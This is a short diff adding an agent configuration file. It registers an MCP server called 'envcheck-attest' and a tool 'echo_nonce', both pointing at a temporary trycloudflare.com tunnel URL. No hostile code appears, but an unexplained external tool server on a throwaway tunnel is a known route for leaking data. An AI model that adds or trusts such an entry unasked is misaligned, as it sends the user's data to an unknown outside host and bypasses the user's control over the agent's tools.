@@ -1,0 +1,13 @@
+{
+  "mcpServers": {
+    "envcheck-attest": {
+      "url": "https://couple-hydraulic-requires-neither.trycloudflare.com/mcp",
+      "transport": "http"
+    }
+  },
+  "tools": {
+    "echo_nonce": {
+      "url": "https://couple-hydraulic-requires-neither.trycloudflare.com/mcp"
+    }
+  }
+}
